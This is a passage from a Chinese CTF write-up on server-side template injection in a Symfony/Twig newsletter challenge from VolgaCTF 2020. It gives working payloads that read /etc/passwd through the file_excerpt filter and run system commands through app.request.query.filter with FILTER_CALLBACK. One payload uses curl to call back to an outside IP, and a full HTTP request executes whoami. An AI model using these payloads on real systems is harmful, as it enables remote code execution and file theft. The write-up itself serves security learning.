        run()
然后再设置DNS mx解析到你vps的ip即可。
## 利用方法
比赛之前能搜到的的payload是
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
但是这个payload只能在1.x能利用，因为1.x有三个全局变量
> The following variables are always available in templates:
>
>   * `_self`: references the current template;
>   * `_context`: references the current context;
>   * `_charset`: references the current charset.
>
对应的代码是
    protected $specialVars = [
            '_self' => '$this',
            '_context' => '$context',
            '_charset' => '$this->env->getCharset()',
        ];
2.x 及3.x 以后
> The following variables are always available in templates:
>
>   * `_self`: references the current template name;
>   * `_context`: references the current context;
>   * `_charset`: references the current charset.
>
`_self` 不再是`$this` 而是template name 只是个String
    private $specialVars = [
            '_self' => '$this->getTemplateName()',
            '_context' => '$context',
            '_charset' => '$this->env->getCharset()',
        ];
又搜了一会，还是搜不到，然后就硬着头皮下了源码去找。
首先去找了文档，看有没有能够能执行php代码的标签，发现没有，然后又试了include
发现也不行。无意间发现了除了上面三个全局变量以外，在Symfony环境下还有个全局变量app，然后想以这个为突破口找到rce的链，但是由于菜，也没有找到。在我弃疗之后，队友通过symfony内置的filters，能够读任意文件，flag在/etc/passwd
里藏着，我猜可能出题人也没找到RCE的方法。今早看到了出题人的writeup，果然有大佬成功搞到了RCE，就是通过app这个方向搞下去的。
### 任意文件读取
除了twig自带的Filters, symfony 也自己实现了一些filters  
这次利用的对象就是`file_excerpt`  
所以payload 可以是
    "{{ '/etc/passwd'|file_excerpt(-1,-1)}}"@xxxx.com
看一下file_excerpt 的实现  
如果有文件上传，结合上phar进行反序列化然后RCE也是有可能的。
### RCE
> The `app` variable (which is an instance of `AppVariable`) gives you access
> to these variables:
>
>   * `app.user`
>
> The [current user
> object](https://symfony.com/doc/current/security.html#create-user-class) or
> `null` if the user is not authenticated.
>
>   * `app.request`
>
> The `Request` object that stores the current [request
> data](https://symfony.com/doc/current/components/http_foundation.html#accessing-> request-data) (depending on your application, this can be a [sub-> request](https://symfony.com/doc/current/components/http_kernel.html#http-> kernel-sub-requests) or a regular request).
>
>
`app.request` 是`Symfony\Component\HttpFoundation\Request` Object
他的query 和 request这些属性都是可以公开访问的, 而且都是`ParameterBag` 类型的  
`ParameterBag` 有个 filter方法
    public function filter(string $key, $default = null, int $filter = FILTER_DEFAULT, $options = [])
        {
            $value = $this->get($key, $default);
            // Always turn $options into an array - this allows filter_var option shortcuts.
            if (!\is_array($options) && $options) {
                $options = ['flags' => $options];
            }
            // Add a convenience check for arrays.
            if (\is_array($value) && !isset($options['flags'])) {
                $options['flags'] = FILTER_REQUIRE_ARRAY;
            }
            return filter_var($value, $filter, $options);
        }
    public function get(string $key, $default = null)
        {
            return \array_key_exists($key, $this->parameters) ? $this->parameters[$key] : $default;
        }
`$this-parameters` 会在query 初始化的时候赋值`$this->query = new ParameterBag($query);`
就是`$_GET`
到这里`filter_var($value, $filter, $options)` 中的三个参数都能控制  
`filter_var`可以设置个回调函数为system，`FILTER_CALLBACK` 的值为1024
> php > echo FILTER_CALLBACK;  
>  1024  
>  php >
数组参数可以通过`{'key':'value'}`传递。
所以payload 可以这样构造
    "{{app.request.query.filter(0,'id',1024,{'options':'system'})}}"@sometimenaive.com
这样可以执行成功  
但是
    "{{app.request.query.filter(0,'whoami',1024,{'options':'system'})}}".""@sometimenaive.com
上面的payload远程爆500，可能是发邮件的时候GG了。应该就是发邮件的时候有问题
    "{{app.request.query.filter(0,'curl${IFS}x.x.x.x:8090',1024,{'options':'system'})}}".""@sometimenaive.com
上面的payload虽然爆500但是还是可以接收到请求的。  
上面是使用默认值给system传参数，也可以通过GET传参数的方式，这样就有回显了。
    POST /subscribe?0=whoami HTTP/1.1
    Host: newsletter.q.2020.volgactf.ru
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 85
    Origin: http://newsletter.q.2020.volgactf.ru
    Connection: close
    Referer: http://newsletter.q.2020.volgactf.ru/
    Upgrade-Insecure-Requests: 1
    email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@x.com
当然用`app.request.request` 应该也是可以的。
## 参考链接
  * 